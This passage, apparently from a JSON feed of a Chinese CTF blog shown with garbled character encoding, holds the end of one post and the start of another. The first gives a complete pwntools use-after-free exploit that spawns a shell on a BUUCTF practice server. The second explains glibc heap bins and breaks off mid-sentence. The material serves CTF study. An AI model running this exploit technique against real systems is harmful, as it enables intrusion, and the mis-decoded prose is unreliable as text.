ä¸ºï¼š</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29844</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./bheap')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./bheap')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bheap'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input size: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input content: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tse<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input list index: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input list index: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>system <span class=\"token operator\">=</span> <span class=\"token number\">0x4007A0</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x0602010</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Print<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "å †",
                "uaf"
            ]
        },
        {
            "id": "http://example.com/2023/08/09/bins/",
            "url": "http://example.com/2023/08/09/bins/",
            "title": "bins",
            "date_published": "2023-08-09T02:57:17.000Z",
            "content_html": "<h1 id=\"pwnå †-binså­¦ä¹ \"><a class=\"markdownIt-Anchor\" href=\"#pwnå †-binså­¦ä¹ \">#</a> pwn å † bins å­¦ä¹ ã€‚</h1>\n<h2 id=\"ä¸€-biné“¾çš„ä»‹ç»\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€-biné“¾çš„ä»‹ç»\">#</a> ä¸€ã€bin é“¾çš„ä»‹ç»</h2>\n<p>bin æ˜¯ä¸€ä¸ªç”± struct chunk ç»“æ„ä½“ç»„æˆçš„é“¾è¡¨ã€‚<br>\nå‰é¢ä»‹ç»è¿‡ï¼Œä¸åŒçš„ chunk æ ¹æ®ç‰¹ç‚¹ä¸åŒåˆ†ä¸ºä¸åŒçš„ chunkï¼Œä¸ºäº†å°†è¿™äº› chunk è¿›è¡Œåˆ†ç±»çš„ç®¡ç†ï¼Œglibc é‡‡ç”¨äº† bin é“¾è¿™ç§æ–¹å¼ç®¡ç†ä¸åŒçš„ chunkã€‚<br>\nä¸åŒçš„ bin é“¾æ˜¯ç”± arena ç®¡ç†çš„ã€‚<br>\nbin é“¾ä¸­çš„ chunk å‡ä¸º free chunkã€‚</p>\n<h2 id=\"äºŒ-biné“¾åˆ†ç±»\"><a class=\"markdownIt-Anchor\" href=\"#äºŒ-biné“¾åˆ†ç±»\">#</a> äºŒã€bin é“¾åˆ†ç±»</h2>\n<ul>\n<li>æ ¹æ® bin é“¾æˆå‘˜çš„å¤§å°ä¸åŒï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š\n<ul>\n<li>fast bin æ˜¯å•é“¾è¡¨ï¼Œå…¶ä»–éƒ½æ˜¯åŒå‘é“¾è¡¨ã€‚</li>\n<li><strong>Fast binã€‚</strong></li>\n<li><strong>Unsorted binã€‚</strong></li>\n<li><strong>Small binã€‚</strong></li>\n<li><strong>Large binã€‚</strong></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ä¸‰-biné“¾çš„ä¿å­˜struct-malloc_stateç»“æ„ä½“\"><a class=\"markdownIt-Anchor\" href=\"#ä¸‰-biné“¾çš„ä¿å­˜struct-malloc_stateç»“æ„ä½“\">#</a> ä¸‰ã€bin é“¾çš„ä¿å­˜ï¼ˆstruct malloc_state ç»“æ„ä½“ï¼‰</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> mchunkptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span> <span class=\"token operator\">*</span>mfastbinptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">/*other member*/</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">/* Fastbins */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  mfastbinptr fastbinsY<span class=\"token punctuation\">[</span>NFASTBINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">/* Normal bins packed as described above */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  mchunkptr bins<span class=\"token punctuation\">[</span>NBINS <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">/*other member*/</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>å‰é¢è¯´è¿‡ï¼Œä¸åŒçš„ bin é“¾æ˜¯ç”± arena ç®¡ç†çš„ã€‚å› æ­¤ä¸€ä¸ªçº¿ç¨‹ä¸­ä¼šæœ‰å¾ˆå¤šçš„ bin é“¾ï¼Œè¿™äº› bin é“¾éƒ½æœ‰ arena æ‰€è¡¨ç¤ºçš„ struct malloc_state ç»“æ„ä½“çš„ä»¥ä¸‹æˆå‘˜ä¿å­˜ï¼š<br>\nfastbinY æ•°ç»„ï¼šå¤§å°ä¸º 10ã€‚è®°å½•çš„æ˜¯ fast bin é“¾ã€‚<br>\nbins æ•°ç»„ï¼šå¤§å°ä¸º 129ã€‚è®°å½•çš„æ˜¯ unsorted binï¼ˆ1ï¼‰ã€small binï¼ˆ2~63ï¼‰ã€large bin é“¾ï¼ˆ64~126ï¼‰ã€‚<br>\n<img data-src=\"/img/bins/4.jpg\" alt=\"img\"></p>\n</blockquote>\n<h2 id=\"å››-fast-bin\"><a class=\"markdownIt-Anchor\" href=\"#å››-fast-bin\">#</a> å››ã€Fast Bin</h2>\n<p>æ¦‚å¿µï¼šchunk çš„å¤§å°åœ¨ 32 å­—èŠ‚ â€”â€”128 å­—èŠ‚ï¼ˆ0x20â€”â€”0x80ï¼‰çš„ chunk ç§°ä¸º â€œfast chunkâ€ï¼ˆå¤§å°ä¸æ˜¯ malloc æ—¶çš„å¤§å°ï¼Œè€Œæ˜¯åœ¨å†…å­˜ä¸­ struct malloc_chunk çš„å¤§å°ï¼ŒåŒ…å«å‰ 2 ä¸ªæˆå‘˜ï¼‰ã€‚<br>\nfast bin é“¾è¡¨çš„ä¸ªæ•°ä¸º 10 ä¸ªã€‚<br>\nä¸ä¼šå¯¹ free chunk è¿›è¡Œåˆå¹¶ï¼šé‰´äºè®¾è®¡ fast bin çš„åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„å°å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤ç³»ç»Ÿå°†å±äº fast bin çš„ chunk çš„ PREV_INUSE ä½æ€»æ˜¯è®¾ç½®ä¸º 1ï¼Œè¿™æ ·å³ä½¿å½“ fast bin ä¸­æœ‰æŸä¸ª chunk åŒä¸€ä¸ª free chunk ç›¸é‚»çš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆå¹¶æ“ä½œï¼Œè€Œæ˜¯ä¿ç•™ä¸¤è€…ã€‚è™½ç„¶è¿™æ ·åšå¯èƒ½ä¼šé€ æˆé¢å¤–çš„ç¢ç‰‡åŒ–é—®é¢˜ï¼Œä½†ç‘•ä¸æ©ç‘œã€‚</p>\n<blockquote>\n<p>fastbinsY æ•°ç»„å­˜å‚¨ fastbins çš„è§„åˆ™</p>\n<ul>\n<li>\n<p>æ¯ä¸ª fast bin é“¾è¡¨éƒ½æ˜¯å•é“¾è¡¨ï¼ˆä½¿ç”¨ fd æŒ‡é’ˆï¼‰ã€‚å› æ­¤ï¼Œfast bin ä¸­æ— è®ºæ˜¯æ·»åŠ è¿˜æ˜¯ç§»é™¤ fast chunkï¼Œéƒ½æ˜¯å¯¹ â€œé“¾è¡¨å°¾â€ è¿›è¡Œæ“ä½œï¼Œè€Œä¸ä¼šå¯¹æŸä¸ªä¸­é—´çš„ fast chunk è¿›è¡Œæ“ä½œã€‚</p>\n</li>\n<li>\n<p>å•ä¸ª fastbin é“¾è¡¨ä¸­çš„ chunk å¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ª fastbin é“¾è¡¨ä¸­çš„ chunk å¤§å°æ˜¯ä¸åŒçš„ã€‚</p>\n</li>\n<li>\n<p>fastbinY æ•°ç»„ä¸­çš„æ¯ä¸ª bin é“¾è¡¨çš„æ’åºï¼Œæ˜¯æŒ‰ç…§é“¾è¡¨å…ƒç´ çš„å¤§å°è¿›è¡Œæ’åºçš„ã€‚æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ fast bin é“¾è¡¨ä¸­çš„æ¯ä¸ª chunk çš„å¤§å°æ˜¯ 32 å­—èŠ‚çš„ï¼Œæ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ çš„ fast bin é“¾è¡¨ä¸­çš„æ¯ä¸ª chunk çš„å¤§å°æ˜¯ 48 å­—èŠ‚çš„â€¦ æ¯ä¸ªå…ƒç´ éƒ½æ¯”å‰é¢çš„ fast bin é“¾å¤§ 16 å­—èŠ‚ï¼Œä»¥æ­¤ç±»æ¨è¿›è¡Œæ’åºã€‚</p>\n<p><img data-src=\"/img/bins/1.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>é“¾è¡¨ç´¢å¼•å®å®šä¹‰ï¼šï¼ˆfastbin_indexï¼‰</p>\n<ul>\n<li>\n<p>** åŠŸèƒ½ï¼š** é€šè¿‡æ­¤å®èƒ½åˆ¤æ–­æŸä¸€ä¸ª fastchunk å±äºå“ªä¸€ä¸ª fastbin é“¾è¡¨ã€‚</p>\n</li>\n<li>\n<p>** å‚æ•°ï¼š** æŸä¸€ä¸ª chunk çš„å¤§å°ã€‚</p>\n<p><img data-src=\"/img/bins/20190730083911707.png\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>malloc æ“ä½œä¸ fastbins çš„åˆå§‹åŒ–ï¼š<br>\nå½“åº”ç”¨å±‚é€šè¿‡ malloc å‡½æ•°ç¬¬ä¸€æ¬¡ç”³è¯·çš„ chunk å±äº 16 å­—èŠ‚ï½80 å­—èŠ‚ä¹‹é—´æ—¶ï¼Œå› ä¸ºåˆå§‹åŒ–çš„æ—¶å€™ fast bin æ”¯æŒçš„æœ€å¤§å†…å­˜å¤§å°ä»¥åŠæ‰€æœ‰ fast bin é“¾è¡¨éƒ½æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å®ƒä¹Ÿä¸ä¼šäº¤ç”± fast bin æ¥å¤„ç†ï¼Œè€Œæ˜¯å‘ä¸‹ä¼ é€’äº¤ç”± small bin æ¥å¤„ç†ï¼Œå¦‚æœ small bin ä¹Ÿä¸ºç©ºçš„è¯å°±äº¤ç»™ unsorted bin å¤„ç†ã€‚</li>\n<li>é‚£ä¹ˆï¼Œfast bin å¦‚ä½•è¿›è¡Œåˆå§‹åŒ–å“ªï¼Ÿ<br>\nå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨ malloc (fast bin) çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰§è¡Œ_int_malloc å‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆä¼šå‘ç°å½“å‰ fast bin ä¸ºç©ºï¼Œå°±è½¬äº¤ç»™ small bin å¤„ç†ï¼Œè¿›è€Œåˆå‘ç° small bin ä¹Ÿä¸ºç©ºï¼Œå°±è°ƒç”¨ malloc_consolidate å‡½æ•°å¯¹ malloc_state ç»“æ„ä½“è¿›è¡Œåˆå§‹åŒ–ã€‚malloc_consolidate å‡½æ•°ä¸»è¦å®Œæˆä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½ï¼š<br>\na  é¦–å…ˆåˆ¤æ–­å½“å‰ malloc_state ç»“æ„ä½“ä¸­çš„ fast bin æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¯´æ˜æ•´ä¸ª malloc_state éƒ½æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œéœ€è¦å¯¹ malloc_state è¿›è¡Œåˆå§‹åŒ–ã€‚<br>\nb  malloc_state çš„åˆå§‹åŒ–æ“ä½œç”±å‡½æ•° malloc_init_state (av) å®Œæˆï¼Œè¯¥å‡½æ•°å…ˆåˆå§‹åŒ–é™¤ fast bin ä¹‹å¤–çš„æ‰€æœ‰çš„ binsï¼Œå†åˆå§‹åŒ– fast binsã€‚<br>\né‚£ä¹ˆå½“å†æ¬¡æ‰§è¡Œ malloc (fast chunk) å‡½æ•°çš„æ—¶å€™ï¼Œæ­¤æ—¶ fast bin ç›¸å…³æ•°æ®ä¸ä¸ºç©ºäº†ï¼Œå°±å¯ä»¥ä½¿ç”¨ fast binã€‚</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>free æ“ä½œ<br>\nè¿™ä¸ªæ“ä½œå¾ˆç®€å•ï¼Œä¸»è¦åˆ†ä¸ºä¸¤æ­¥ï¼šå…ˆé€šè¿‡ chunksize å‡½æ•°æ ¹æ®ä¼ å…¥çš„åœ°å€æŒ‡é’ˆè·å–è¯¥æŒ‡é’ˆå¯¹åº”çš„ chunk çš„å¤§å°ï¼›ç„¶åæ ¹æ®è¿™ä¸ª chunk å¤§å°è·å–è¯¥ chunk æ‰€å±çš„ fast binï¼Œç„¶åå†å°†æ­¤ chunk æ·»åŠ åˆ°è¯¥ fast bin çš„é“¾å°¾å³å¯ã€‚æ•´ä¸ªæ“ä½œéƒ½æ˜¯åœ¨_int_free å‡½æ•°ä¸­å®Œæˆã€‚</li>\n</ul>\n</blockquote>\n<h2 id=\"äº”-unsorted-bin\"><a class=\"markdownIt-Anchor\" href=\"#äº”-unsorted-bin\">#</a> äº”ã€Unsorted Bin</h2>\n<p>ä½•æ—¶ä½¿ç”¨ï¼šå½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„ chunk çš„æ—¶å€™ï¼Œå¦‚æœç³»ç»Ÿæ²¡æœ‰å°†å®ƒä»¬æ·»åŠ åˆ°å¯¹åº”çš„ bins ä¸­ï¼Œç³»ç»Ÿå°±å°†è¿™äº› chunk æ·»åŠ åˆ° unsorted bin ä¸­ã€‚<br>\nç›®çš„ï¼šè¿™ä¸»è¦æ˜¯ä¸ºäº†è®© â€œglibc malloc æœºåˆ¶â€ èƒ½å¤Ÿæœ‰ç¬¬äºŒæ¬¡æœºä¼šé‡æ–°åˆ©ç”¨æœ€è¿‘é‡Šæ”¾çš„ chunk (ç¬¬ä¸€æ¬¡æœºä¼šå°±æ˜¯ fast bin æœºåˆ¶)ã€‚åˆ©ç”¨ unsorted binï¼Œå¯ä»¥åŠ å¿«å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾æ“ä½œï¼Œå› ä¸ºæ•´ä¸ªæ“ä½œéƒ½ä¸å†éœ€è¦èŠ±è´¹é¢å¤–çš„æ—¶é—´å»æŸ¥æ‰¾åˆé€‚çš„ bin äº†ã€‚<br>\nUnsorted bin çš„ç‰¹æ€§å¦‚ä¸‹ï¼š<br>\nunsorted bin çš„ä¸ªæ•°ï¼š 1 ä¸ªã€‚<br>\nunsorted bin æ˜¯ä¸€ä¸ªç”± free chunks ç»„æˆçš„å¾ªç¯åŒé“¾è¡¨ã€‚<br>\nåœ¨ unsorted bin ä¸­ï¼Œå¯¹ chunk çš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„ chunk éƒ½å¯ä»¥å½’å±åˆ° unsorted bin ä¸­ã€‚<br>\nunsortedbin 